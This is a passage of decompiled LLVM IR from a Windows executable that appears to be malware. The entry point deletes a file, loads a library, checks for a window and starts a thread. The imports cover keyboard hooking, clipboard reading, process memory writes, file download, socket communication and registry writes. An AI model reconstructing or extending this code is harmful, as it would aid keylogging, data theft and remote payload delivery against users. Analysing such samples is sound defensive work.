  %93 = trunc i32 %92 to i8, !insn.addr !2144
  %94 = add i8 %91, %93, !insn.addr !2144
  store i8 %94, i8* %90, align 1, !insn.addr !2144
  ret i32 %88, !insn.addr !2144

dec_label_pc_407ab1:                              ; preds = %dec_label_pc_407a15
  %95 = add i32 %46, 1, !insn.addr !2145
  store i32 %95, i32* %eax, align 4, !insn.addr !2145
  %96 = inttoptr i32 %arg4 to i8*, !insn.addr !2146
  %97 = load i8, i8* %96, align 1, !insn.addr !2146
  %98 = udiv i32 %arg3, 256, !insn.addr !2146
  %99 = trunc i32 %98 to i8, !insn.addr !2146
  %100 = add i8 %97, %99, !insn.addr !2146
  store i8 %100, i8* %96, align 1, !insn.addr !2146
  %101 = add i32 %arg3, 89, !insn.addr !2147
  %102 = inttoptr i32 %101 to i8*, !insn.addr !2147
  store i8 -1, i8* %102, align 1, !insn.addr !2147
  call void @__writefsdword(i32 %95, i32 %arg3), !insn.addr !2148
  %103 = load i32, i32* %eax, align 4, !insn.addr !2149
  ret i32 %103, !insn.addr !2149

dec_label_pc_407ac9:                              ; preds = %dec_label_pc_407a48
  %104 = load i32, i32* %eax, align 4, !insn.addr !2150
  ret i32 %104, !insn.addr !2150
}

define i32 @function_407acc() local_unnamed_addr {
dec_label_pc_407acc:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096f4, align 4, !insn.addr !2151
  %2 = add i32 %1, -1, !insn.addr !2151
  store i32 %2, i32* @global_var_4096f4, align 4, !insn.addr !2151
  ret i32 %0, !insn.addr !2152
}

define i32 @function_407ad4() local_unnamed_addr {
dec_label_pc_407ad4:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2153
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !2153
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !2153
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2154
  %2 = load i32, i32* @global_var_4096f8, align 4, !insn.addr !2155
  %3 = add i32 %2, 1, !insn.addr !2155
  store i32 %3, i32* @global_var_4096f8, align 4, !insn.addr !2155
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !2156
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !2157
  ret i32 0, !insn.addr !2158
}

define i32 @function_407af9() local_unnamed_addr {
dec_label_pc_407af9:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2159
  ret i32 %0, !insn.addr !2159
}

define i32 @function_407afe() local_unnamed_addr {
dec_label_pc_407afe:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2160
}

define i32 @function_407b00(i32 %arg1) local_unnamed_addr {
dec_label_pc_407b00:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2161
}

define i32 @function_407b04() local_unnamed_addr {
dec_label_pc_407b04:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096f8, align 4, !insn.addr !2162
  %2 = add i32 %1, -1, !insn.addr !2162
  store i32 %2, i32* @global_var_4096f8, align 4, !insn.addr !2162
  ret i32 %0, !insn.addr !2163
}

define i32 @function_407b0c() local_unnamed_addr {
dec_label_pc_407b0c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2164
}

define i32 @SetFieldText.50() local_unnamed_addr {
dec_label_pc_407b37:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2165
  ret i32 %0, !insn.addr !2165
}

define i32 @function_407b3c() local_unnamed_addr {
dec_label_pc_407b3c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2166
}

define i32 @function_407b3e(i32 %arg1) local_unnamed_addr {
dec_label_pc_407b3e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2167
}

define i32 @entry_point() local_unnamed_addr {
dec_label_pc_407c40:
  %esp.2.reg2mem = alloca i32, !insn.addr !2168
  %esp.1.reg2mem = alloca i32, !insn.addr !2168
  %esp.0.reg2mem = alloca i32, !insn.addr !2168
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-136 = alloca i8*, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %1 = call i32 @"@InitLib"(i32 %0), !insn.addr !2169
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !2170
  store i32 %2, i32* %stack_var_-116, align 4, !insn.addr !2170
  %3 = ptrtoint i32* %stack_var_-116 to i32, !insn.addr !2170
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !2171
  store i32 0, i32* %stack_var_-128, align 4, !insn.addr !2172
  %4 = call i32 @GetModuleFileNameA(i32* inttoptr (i32 260 to i32*), i8* bitcast (i8** @global_var_4096fc to i8*), i32 0), !insn.addr !2173
  %5 = add i32 %4, ptrtoint (i8** @global_var_4096fc to i32), !insn.addr !2174
  %6 = inttoptr i32 %5 to i8*, !insn.addr !2174
  store i8 0, i8* %6, align 1, !insn.addr !2174
  %7 = call i32 @"@LStrFromArray"(), !insn.addr !2175
  %8 = call i32 @function_40708c(), !insn.addr !2176
  %9 = call i32 @"@LStrAsg"(), !insn.addr !2177
  %10 = call i32 @function_407104(), !insn.addr !2178
  %11 = trunc i32 %10 to i8, !insn.addr !2179
  %12 = icmp eq i8 %11, 0, !insn.addr !2179
  br i1 %12, label %dec_label_pc_407d47, label %dec_label_pc_407ccc, !insn.addr !2180

dec_label_pc_407ccc:                              ; preds = %dec_label_pc_407c40
  %13 = load i32, i32* @global_var_40812c, align 4, !insn.addr !2181
  %14 = inttoptr i32 %13 to i32*, !insn.addr !2182
  store i32 -1, i32* %14, align 4, !insn.addr !2182
  %15 = call i32 @"@LStrFromArray"(), !insn.addr !2183
  %16 = call i32 @function_4070cc(), !insn.addr !2184
  %17 = call i32 @"@LStrAsg"(), !insn.addr !2185
  %18 = call i32 @"@LStrCat3"(), !insn.addr !2186
  %19 = call i32 @function_4036c8(), !insn.addr !2187
  %20 = inttoptr i32 %19 to i8*, !insn.addr !2188
  %21 = call i1 @DeleteFileA(i8* %20), !insn.addr !2189
  %22 = call i32 @"@LStrCat3"(), !insn.addr !2190
  %23 = call i32 @function_4036c8(), !insn.addr !2191
  %24 = inttoptr i32 %23 to i8*, !insn.addr !2192
  store i8* %24, i8** %stack_var_-136, align 4, !insn.addr !2192
  %25 = ptrtoint i8** %stack_var_-136 to i32, !insn.addr !2192
  %26 = call i32* @LoadLibraryA(i8* %24), !insn.addr !2193
  %27 = ptrtoint i32* %26 to i32, !insn.addr !2193
  store i32 %27, i32* @global_var_408118, align 4, !insn.addr !2194
  store i32 %25, i32* %esp.0.reg2mem, !insn.addr !2195
  br label %dec_label_pc_407d74, !insn.addr !2195

dec_label_pc_407d47:                              ; preds = %dec_label_pc_407c40
  %28 = ptrtoint i32* %stack_var_-128 to i32, !insn.addr !2172
  %29 = call i32 @function_4060f0(), !insn.addr !2196
  %30 = call i32 @function_407104(), !insn.addr !2197
  %31 = trunc i32 %30 to i8, !insn.addr !2198
  %32 = icmp eq i8 %31, 0, !insn.addr !2198
  store i32 %28, i32* %esp.2.reg2mem, !insn.addr !2199
  br i1 %32, label %dec_label_pc_407eb6, label %dec_label_pc_407d69, !insn.addr !2199

dec_label_pc_407d69:                              ; preds = %dec_label_pc_407d47
  %33 = load i32, i32* @global_var_408138, align 4, !insn.addr !2200
  %34 = inttoptr i32 %33 to i32*, !insn.addr !2201
  store i32 -1, i32* %34, align 4, !insn.addr !2201
  store i32 %28, i32* %esp.0.reg2mem, !insn.addr !2201
  br label %dec_label_pc_407d74, !insn.addr !2201

dec_label_pc_407d74:                              ; preds = %dec_label_pc_407d69, %dec_label_pc_407ccc
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %35 = add i32 %esp.0.reload, -4, !insn.addr !2202
  %36 = inttoptr i32 %35 to i32*, !insn.addr !2202
  store i32 260, i32* %36, align 4, !insn.addr !2202
  %37 = add i32 %esp.0.reload, -8, !insn.addr !2203
  %38 = inttoptr i32 %37 to i32*, !insn.addr !2203
  store i32 ptrtoint (i8** @global_var_4096fc to i32), i32* %38, align 4, !insn.addr !2203
  %39 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4, !insn.addr !2204
  %40 = ptrtoint i32 (i32, i32, i32)* %39 to i32, !insn.addr !2204
  %41 = add i32 %esp.0.reload, -12, !insn.addr !2205
  %42 = inttoptr i32 %41 to i32*, !insn.addr !2205
  store i32 %40, i32* %42, align 4, !insn.addr !2205
  %43 = call i32 @GetModuleFileNameA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !2206
  %44 = add i32 %43, ptrtoint (i8** @global_var_4096fc to i32), !insn.addr !2207
  %45 = inttoptr i32 %44 to i8*, !insn.addr !2207
  store i8 0, i8* %45, align 1, !insn.addr !2207
  %46 = call i32 @"@LStrFromArray"(), !insn.addr !2208
  %47 = call i32 @function_4070cc(), !insn.addr !2209
  %48 = call i32 @"@LStrAsg"(), !insn.addr !2210
  %49 = call i32 @"@LStrCat3"(), !insn.addr !2211
  %50 = load i32, i32* @global_var_408138, align 4, !insn.addr !2212
  %51 = icmp eq i32 %50, 0, !insn.addr !2212
  br i1 %51, label %dec_label_pc_407e0d, label %dec_label_pc_407dda, !insn.addr !2213

dec_label_pc_407dda:                              ; preds = %dec_label_pc_407d74
  %52 = add i32 %esp.0.reload, -16, !insn.addr !2214
  %53 = inttoptr i32 %52 to i32*, !insn.addr !2214
  store i32 ptrtoint ([16 x i8]* @global_var_407f38 to i32), i32* %53, align 4, !insn.addr !2214
  %54 = add i32 %esp.0.reload, -20, !insn.addr !2215
  %55 = inttoptr i32 %54 to i32*, !insn.addr !2215
  store i32 ptrtoint ([8 x i8]* @global_var_407f48 to i32), i32* %55, align 4, !insn.addr !2215
  %56 = call i32* @FindWindowA(i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2216
  %57 = icmp eq i32* %56, null, !insn.addr !2217
  %58 = icmp eq i1 %57, false, !insn.addr !2218
  store i32 %54, i32* %esp.2.reg2mem, !insn.addr !2218
  br i1 %58, label %dec_label_pc_407eb6, label %dec_label_pc_407df1, !insn.addr !2218

dec_label_pc_407df1:                              ; preds = %dec_label_pc_407dda
  %59 = add i32 %esp.0.reload, -24, !insn.addr !2219
  %60 = inttoptr i32 %59 to i32*, !insn.addr !2219
  store i32 ptrtoint (i32* @global_var_40980c to i32), i32* %60, align 4, !insn.addr !2219
  %61 = add i32 %esp.0.reload, -28, !insn.addr !2220
  %62 = inttoptr i32 %61 to i32*, !insn.addr !2220
  store i32 0, i32* %62, align 4, !insn.addr !2220
  %63 = add i32 %esp.0.reload, -32, !insn.addr !2221
  %64 = inttoptr i32 %63 to i32*, !insn.addr !2221
  store i32 66, i32* %64, align 4, !insn.addr !2221
  %65 = add i32 %esp.0.reload, -36, !insn.addr !2222
  %66 = inttoptr i32 %65 to i32*, !insn.addr !2222
  store i32 4220780, i32* %66, align 4, !insn.addr !2222
  %67 = add i32 %esp.0.reload, -40, !insn.addr !2223
  %68 = inttoptr i32 %67 to i32*, !insn.addr !2223
  store i32 0, i32* %68, align 4, !insn.addr !2223
  %69 = add i32 %esp.0.reload, -44, !insn.addr !2224
  %70 = inttoptr i32 %69 to i32*, !insn.addr !2224
  store i32 0, i32* %70, align 4, !insn.addr !2224
  %71 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 (i32*)* bitcast (i32* @0 to i32 (i32*)*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2225
  store i32 %69, i32* %esp.2.reg2mem, !insn.addr !2226
  br label %dec_label_pc_407eb6, !insn.addr !2226

dec_label_pc_407e0d:                              ; preds = %dec_label_pc_407d74
  %72 = load i32, i32* @global_var_40812c, align 4, !insn.addr !2227
  %73 = icmp eq i32 %72, 0, !insn.addr !2227
  store i32 %41, i32* %esp.2.reg2mem, !insn.addr !2228
  br i1 %73, label %dec_label_pc_407eb6, label %dec_label_pc_407e1b, !insn.addr !2228

dec_label_pc_407e1b:                              ; preds = %dec_label_pc_407e0d
  %74 = load i8, i8* bitcast (i32** @global_var_408160 to i8*), align 4, !insn.addr !2229
  %75 = icmp eq i8 %74, 0, !insn.addr !2229
  br i1 %75, label %dec_label_pc_407e2a, label %dec_label_pc_407e25, !insn.addr !2230

dec_label_pc_407e25:                              ; preds = %dec_label_pc_407e1b
  %76 = call i32 @function_40692c(), !insn.addr !2231
  br label %dec_label_pc_407e2a, !insn.addr !2231

dec_label_pc_407e2a:                              ; preds = %dec_label_pc_407e25, %dec_label_pc_407e1b
  %77 = load i32, i32* @global_var_408148, align 4, !insn.addr !2232
  %78 = icmp slt i32 %77, 1, !insn.addr !2233
  br i1 %78, label %dec_label_pc_407e67, label %dec_label_pc_407e34, !insn.addr !2233

dec_label_pc_407e34:                              ; preds = %dec_label_pc_407e2a
  %79 = call i32 @function_404d38(), !insn.addr !2234
  %80 = call i32 @"@LStrCmp"(), !insn.addr !2235
  %81 = load i32, i32* @global_var_408154, align 4, !insn.addr !2236
  %82 = inttoptr i32 %81 to i32*, !insn.addr !2237
  store i32 -1, i32* %82, align 4, !insn.addr !2237
  %83 = load i32, i32* @global_var_408154, align 4, !insn.addr !2238
  %84 = icmp eq i32 %83, 0, !insn.addr !2238
  br i1 %84, label %dec_label_pc_407e67, label %dec_label_pc_407e62, !insn.addr !2239

dec_label_pc_407e62:                              ; preds = %dec_label_pc_407e34
  %85 = call i32 @function_40600c(), !insn.addr !2240
  br label %dec_label_pc_407e67, !insn.addr !2240

dec_label_pc_407e67:                              ; preds = %dec_label_pc_407e62, %dec_label_pc_407e34, %dec_label_pc_407e2a
  %86 = add i32 %esp.0.reload, -16, !insn.addr !2241
  %87 = inttoptr i32 %86 to i32*, !insn.addr !2241
  store i32 3, i32* %87, align 4, !insn.addr !2241
  %88 = add i32 %esp.0.reload, -20, !insn.addr !2242
  %89 = inttoptr i32 %88 to i32*, !insn.addr !2242
  store i32 16065, i32* %89, align 4, !insn.addr !2242
  %90 = load i32, i32* @global_var_408118, align 4, !insn.addr !2243
  %91 = add i32 %esp.0.reload, -24, !insn.addr !2244
  %92 = inttoptr i32 %91 to i32*, !insn.addr !2244
  store i32 %90, i32* %92, align 4, !insn.addr !2244
  %93 = call i32* @FindResourceA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2245
  %94 = icmp eq i32* %93, null, !insn.addr !2246
  %95 = icmp eq i1 %94, false, !insn.addr !2247
  store i32 %91, i32* %esp.1.reg2mem, !insn.addr !2247
  br i1 %95, label %dec_label_pc_407ea7, label %dec_label_pc_407e7d, !insn.addr !2247

dec_label_pc_407e7d:                              ; preds = %dec_label_pc_407e67
  %96 = add i32 %esp.0.reload, -28, !insn.addr !2248
  %97 = inttoptr i32 %96 to i32*, !insn.addr !2248
  store i32 14, i32* %97, align 4, !insn.addr !2248
  %98 = add i32 %esp.0.reload, -32, !insn.addr !2249
  %99 = inttoptr i32 %98 to i32*, !insn.addr !2249
  store i32 16065, i32* %99, align 4, !insn.addr !2249
  %100 = load i32, i32* @global_var_408118, align 4, !insn.addr !2250
  %101 = add i32 %esp.0.reload, -36, !insn.addr !2251
  %102 = inttoptr i32 %101 to i32*, !insn.addr !2251
  store i32 %100, i32* %102, align 4, !insn.addr !2251
  %103 = call i32* @FindResourceA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2252
  %104 = icmp eq i32* %103, null, !insn.addr !2253
  %105 = icmp eq i1 %104, false, !insn.addr !2254
  store i32 %101, i32* %esp.1.reg2mem, !insn.addr !2254
  br i1 %105, label %dec_label_pc_407ea7, label %dec_label_pc_407e93, !insn.addr !2254

dec_label_pc_407e93:                              ; preds = %dec_label_pc_407e7d
  %106 = add i32 %esp.0.reload, -40, !insn.addr !2255
  %107 = inttoptr i32 %106 to i32*, !insn.addr !2255
  store i32 16065, i32* %107, align 4, !insn.addr !2255
  %108 = load i32, i32* @global_var_408118, align 4, !insn.addr !2256
  %109 = add i32 %esp.0.reload, -44, !insn.addr !2257
  %110 = inttoptr i32 %109 to i32*, !insn.addr !2257
  store i32 %108, i32* %110, align 4, !insn.addr !2257
  %111 = call i32* @LoadIconA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*)), !insn.addr !2258
  %112 = icmp eq i32* %111, null, !insn.addr !2259
  store i32 %109, i32* %esp.1.reg2mem, !insn.addr !2260
  store i32 %109, i32* %esp.2.reg2mem, !insn.addr !2260
  br i1 %112, label %dec_label_pc_407eb6, label %dec_label_pc_407ea7, !insn.addr !2260

dec_label_pc_407ea7:                              ; preds = %dec_label_pc_407e93, %dec_label_pc_407e7d, %dec_label_pc_407e67
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %113 = call i32 @function_4079a0(), !insn.addr !2261
  store i32 4225804, i32* @global_var_409654, align 4, !insn.addr !2262
  store i32 %esp.1.reload, i32* %esp.2.reg2mem, !insn.addr !2262
  br label %dec_label_pc_407eb6, !insn.addr !2262

dec_label_pc_407eb6:                              ; preds = %dec_label_pc_407ea7, %dec_label_pc_407e93, %dec_label_pc_407e0d, %dec_label_pc_407df1, %dec_label_pc_407dda, %dec_label_pc_407d47
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %114 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !2263
  %115 = load i32, i32* %114, align 4, !insn.addr !2263
  call void @__writefsdword(i32 0, i32 %115), !insn.addr !2264
  %116 = add i32 %esp.2.reload, 8, !insn.addr !2265
  %117 = inttoptr i32 %116 to i32*, !insn.addr !2265
  store i32 4226776, i32* %117, align 4, !insn.addr !2265
  %118 = call i32 @"@LStrArrayClr"(), !insn.addr !2266
  ret i32 %118, !insn.addr !2267
}

define i32 @function_407ed1() local_unnamed_addr {
dec_label_pc_407ed1:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2268
  ret i32 %0, !insn.addr !2268
}

define i32 @function_407ed6() local_unnamed_addr {
dec_label_pc_407ed6:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2269
}

declare void @DeleteCriticalSection(%_RTL_CRITICAL_SECTION*) local_unnamed_addr

declare void @LeaveCriticalSection(%_RTL_CRITICAL_SECTION*) local_unnamed_addr

declare void @EnterCriticalSection(%_RTL_CRITICAL_SECTION*) local_unnamed_addr

declare void @InitializeCriticalSection(%_RTL_CRITICAL_SECTION*) local_unnamed_addr

declare i1 @VirtualFree(i32*, i32, i32) local_unnamed_addr

declare i32* @VirtualAlloc(i32*, i32, i32, i32) local_unnamed_addr

declare i32* @LocalFree(i32*) local_unnamed_addr

declare i32* @LocalAlloc(i32, i32) local_unnamed_addr

declare i32 @GetTickCount() local_unnamed_addr

declare i1 @QueryPerformanceCounter(%_LARGE_INTEGER*) local_unnamed_addr

declare i32 @GetVersion() local_unnamed_addr

declare i32 @GetCurrentThreadId() local_unnamed_addr

declare i32 @GetThreadLocale() local_unnamed_addr

declare void @GetStartupInfoA(%_STARTUPINFOA*) local_unnamed_addr

declare i32 @GetLocaleInfoA(i32, i32, i8*, i32) local_unnamed_addr

declare i8* @GetCommandLineA() local_unnamed_addr

declare i1 @FreeLibrary(i32*) local_unnamed_addr

declare void @ExitProcess(i32) local_unnamed_addr

declare i1 @WriteFile(i32*, i32*, i32, i32*, %_OVERLAPPED*) local_unnamed_addr

declare i32 @UnhandledExceptionFilter(%_EXCEPTION_POINTERS*) local_unnamed_addr

declare void @RtlUnwind(i32*, i32*, %_EXCEPTION_RECORD*, i32*) local_unnamed_addr

declare void @RaiseException(i32, i32, i32, i32*) local_unnamed_addr

declare i32* @GetStdHandle(i32) local_unnamed_addr

declare i32 @GetKeyboardType(i32) local_unnamed_addr

declare i32 @MessageBoxA(i32*, i8*, i8*, i32) local_unnamed_addr

declare i32 @RegQueryValueExA(i32*, i8*, i32*, i32*, i8*, i32*) local_unnamed_addr

declare i32 @RegOpenKeyExA(i32*, i8*, i32, i32, i32**) local_unnamed_addr

declare i32 @RegCloseKey(i32*) local_unnamed_addr

declare void @SysFreeString(i16*) local_unnamed_addr

declare i32 @SysReAllocStringLen(i16**, i16*, i32) local_unnamed_addr

declare i1 @TlsSetValue(i32, i32*) local_unnamed_addr

declare i32* @TlsGetValue(i32) local_unnamed_addr

declare i1 @TlsFree(i32) local_unnamed_addr

declare i32 @TlsAlloc() local_unnamed_addr

declare i32 @LocalFree.2() local_unnamed_addr

declare i32 @LocalAlloc.3() local_unnamed_addr

declare i32 @RegSetValueExA(i32*, i8*, i32, i32, i8*, i32) local_unnamed_addr

declare i32 @RegQueryValueExA.4() local_unnamed_addr

declare i32 @RegOpenKeyExA.5() local_unnamed_addr

declare i32 @RegDeleteKeyA(i32*, i8*) local_unnamed_addr

declare i32 @RegCreateKeyExA(i32*, i8*, i32, i8*, i32, i32, %_SECURITY_ATTRIBUTES*, i32**, i32*) local_unnamed_addr

declare i32 @RegCloseKey.6() local_unnamed_addr

declare i8* @lstrcpyA(i8*, i8*) local_unnamed_addr

declare i32 @lstrcmpiA(i8*, i8*) local_unnamed_addr

declare i1 @WriteProcessMemory(i32*, i32*, i32*, i32, i32*) local_unnamed_addr

declare i32 @WriteFile.7() local_unnamed_addr

declare i1 @VirtualProtect(i32*, i32, i32, i32*) local_unnamed_addr

declare void @Sleep(i32) local_unnamed_addr

declare i1 @SetEndOfFile(i32*) local_unnamed_addr

declare i1 @ReadFile(i32*, i32*, i32, i32*, %_OVERLAPPED*) local_unnamed_addr

declare i32* @LoadLibraryA(i8*) local_unnamed_addr

declare i1 @GlobalUnlock(i32*) local_unnamed_addr

declare i32* @GlobalLock(i32*) local_unnamed_addr

declare i32* @GlobalFree(i32*) local_unnamed_addr

declare i32* @GlobalAlloc(i32, i32) local_unnamed_addr

declare i32 @GetTickCount.8() local_unnamed_addr

declare i32 @GetTempPathA(i32, i8*) local_unnamed_addr

declare i32 ()* @GetProcAddress(i32*, i8*) local_unnamed_addr

declare i32* @GetModuleHandleA(i8*) local_unnamed_addr

declare i32 @GetModuleFileNameA(i32*, i8*, i32) local_unnamed_addr

declare i32 @GetFileSize(i32*, i32*) local_unnamed_addr

declare i32* @GetCurrentProcess() local_unnamed_addr

declare void @FreeLibraryAndExitThread(i32*, i32) local_unnamed_addr

declare i32* @FindResourceA(i32*, i8*, i8*) local_unnamed_addr

declare i32 @ExitProcess.9() local_unnamed_addr

declare i1 @DeleteFileA(i8*) local_unnamed_addr

declare i32* @CreateThread(%_SECURITY_ATTRIBUTES*, i32, i32 (i32*)*, i32*, i32, i32*) local_unnamed_addr

declare i32* @CreateFileA(i8*, i32, i32, %_SECURITY_ATTRIBUTES*, i32, i32, i32*) local_unnamed_addr

declare i1 @CopyFileA(i8*, i8*, i1) local_unnamed_addr

declare i32 @CompareStringA(i32, i32, i8*, i32, i8*, i32) local_unnamed_addr

declare i1 @CloseHandle(i32*) local_unnamed_addr

declare i32* @SelectObject(i32*, i32*) local_unnamed_addr

declare i32* @GetStockObject(i32) local_unnamed_addr

declare i1 @GetCharWidthA(i32*, i32, i32, i32*) local_unnamed_addr

declare i32 @CreateWindowExA.10() local_unnamed_addr

declare i1 @UnhookWindowsHookEx(i32*) local_unnamed_addr

declare i32 @ToAscii(i32, i32, i8*, i16*, i32) local_unnamed_addr

declare i32* @SetWindowsHookExA(i32, i32 (i32, i32, i32)*, i32*, i32) local_unnamed_addr

declare i32 @SetWindowLongA(i32*, i32, i32) local_unnamed_addr

declare i32 @SetTimer(i32*, i32, i32, void (i32*, i32, i32, i32)*) local_unnamed_addr

declare i32 @SendMessageA(i32*, i32, i32, i32) local_unnamed_addr

declare i32 @ReleaseDC(i32*, i32*) local_unnamed_addr

declare void @PostQuitMessage(i32) local_unnamed_addr

declare i1 @PostMessageA(i32*, i32, i32, i32) local_unnamed_addr

declare i1 @OpenClipboard(i32*) local_unnamed_addr

declare i32* @LoadIconA(i32*, i8*) local_unnamed_addr

declare i1 @KillTimer(i32*, i32) local_unnamed_addr

declare i1 @IsWindowVisible(i32*) local_unnamed_addr

declare i1 @IsWindow(i32*) local_unnamed_addr

declare i32 @GetWindowThreadProcessId(i32*, i32*) local_unnamed_addr

declare i32 @GetWindowLongA(i32*, i32) local_unnamed_addr

declare i32* @GetTopWindow(i32*) local_unnamed_addr

declare i32* @GetParent(i32*) local_unnamed_addr

declare i32* @GetWindow(i32*, i32) local_unnamed_addr

declare i1 @GetMessageA(%tagMSG*, i32*, i32, i32) local_unnamed_addr

declare i1 @GetKeyboardState(i8*) local_unnamed_addr

declare i32* @GetDC(i32*) local_unnamed_addr

declare i32* @GetClipboardData(i32) local_unnamed_addr

declare i32 @GetClassNameA(i32*, i8*, i32) local_unnamed_addr

declare i32 @GetClassLongA(i32*, i32) local_unnamed_addr

declare i1 @GetCaretPos(%tagPOINT*) local_unnamed_addr

declare i32* @FindWindowExA(i32*, i32*, i8*, i8*) local_unnamed_addr

declare i32* @FindWindowA(i8*, i8*) local_unnamed_addr

declare i1 @EnumWindows(i1 (i32*, i32)*, i32) local_unnamed_addr

declare i32 @DispatchMessageA(%tagMSG*) local_unnamed_addr

declare i32 @DefWindowProcA(i32*, i32, i32, i32) local_unnamed_addr

declare i1 @CloseClipboard() local_unnamed_addr

declare i32 @CallNextHookEx(i32*, i32, i32, i32) local_unnamed_addr

declare i32 @WSACleanup() local_unnamed_addr

declare i32 @WSAStartup(i16, %WSAData*) local_unnamed_addr

declare i32 @gethostname(i8*, i32) local_unnamed_addr

declare %hostent* @gethostbyname(i8*) local_unnamed_addr

declare i32 @socket(i32, i32, i32) local_unnamed_addr

declare i32 @send(i32, i8*, i32, i32) local_unnamed_addr

declare i32 @recv(i32, i8*, i32, i32) local_unnamed_addr

declare i8* @inet_ntoa(%in_addr) local_unnamed_addr

declare i16 @htons(i16) local_unnamed_addr

declare i32 @connect(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @closesocket(i32) local_unnamed_addr

declare i32* @ShellExecuteA(i32*, i8*, i8*, i8*, i8*, i32) local_unnamed_addr

declare i32 @URLDownloadToFileA(i32*, i8*, i8*, i32, i32*) local_unnamed_addr

declare i32 @URLDownloadToFileA.11() local_unnamed_addr

declare i1 @PathFileExistsA(i8*) local_unnamed_addr

declare i32* @ImageDirectoryEntryToData(i32*, i8, i16, i32*) local_unnamed_addr

; Function Attrs: nounwind readnone speculatable
declare i8 @llvm.ctpop.i8(i8) #0

declare i8 @__asm_in(i16) local_unnamed_addr

declare void @__asm_outsd(i16, i32) local_unnamed_addr

declare i32 @__asm_bound(i64) local_unnamed_addr

declare void @__asm_outsb(i16, i8) local_unnamed_addr

declare i32 @__asm_insd(i16) local_unnamed_addr

declare i32 @__asm_iretd() local_unnamed_addr

declare void @__asm_into(i32) local_unnamed_addr

declare i8 @__asm_insb(i16) local_unnamed_addr

declare void @__asm_arpl(i16, i16) local_unnamed_addr

declare i32 @__readfsdword(i32) local_unnamed_addr

declare void @__writefsdword(i32, i32) local_unnamed_addr

declare i8 @__readgsbyte(i32) local_unnamed_addr

declare void @__writegsbyte(i32, i8) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i1 @__decompiler_undefined_function_1() local_unnamed_addr

declare x86_fp80 @__decompiler_undefined_function_11() local_unnamed_addr

attributes #0 = { nounwind readnone speculatable }

!0 = !{i64 4198496}
!1 = !{i64 4198504}
!2 = !{i64 4198512}
!3 = !{i64 4198520}
!4 = !{i64 4198528}
!5 = !{i64 4198536}
!6 = !{i64 4198544}
!7 = !{i64 4198552}
!8 = !{i64 4198560}
!9 = !{i64 4198568}
!10 = !{i64 4198576}
!11 = !{i64 4198584}
!12 = !{i64 4198592}
!13 = !{i64 4198600}
!14 = !{i64 4198608}
!15 = !{i64 4198616}
!16 = !{i64 4198624}
!17 = !{i64 4198632}
!18 = !{i64 4198640}
!19 = !{i64 4198648}
!20 = !{i64 4198656}
!21 = !{i64 4198700}
!22 = !{i64 4198708}
!23 = !{i64 4198716}
!24 = !{i64 4198724}
!25 = !{i64 4198732}
!26 = !{i64 4198740}
!27 = !{i64 4198748}
!28 = !{i64 4198756}
!29 = !{i64 4200622}
!30 = !{i64 4200627}
!31 = !{i64 4200629}
!32 = !{i64 4200635}
!33 = !{i64 4202592}
!34 = !{i64 4202597}
!35 = !{i64 4202599}
!36 = !{i64 4202608}
!37 = !{i64 4203014}
!38 = !{i64 4203019}
!39 = !{i64 4203021}
!40 = !{i64 4203029}
!41 = !{i64 4203685}
!42 = !{i64 4203690}
!43 = !{i64 4203692}
!44 = !{i64 4203700}
!45 = !{i64 4203859}
!46 = !{i64 4203933}
!47 = !{i64 4203947}
!48 = !{i64 4204720}
!49 = !{i64 4205241}
!50 = !{i64 4205244}
!51 = !{i64 4205248}
!52 = !{i64 4205252}
!53 = !{i64 4205294}
!54 = !{i64 4205337}
!55 = !{i64 4205346}
!56 = !{i64 4205349}
!57 = !{i64 4205351}
!58 = !{i64 4205362}
!59 = !{i64 4205367}
!60 = !{i64 4205372}
!61 = !{i64 4205397}
!62 = !{i64 4206143}
!63 = !{i64 4206165}
!64 = !{i64 4206325}
!65 = !{i64 4206951}
!66 = !{i64 4207089}
!67 = !{i64 4207447}
!68 = !{i64 4207453}
!69 = !{i64 4207458}
!70 = !{i64 4207471}
!71 = !{i64 4207776}
!72 = !{i64 4207790}
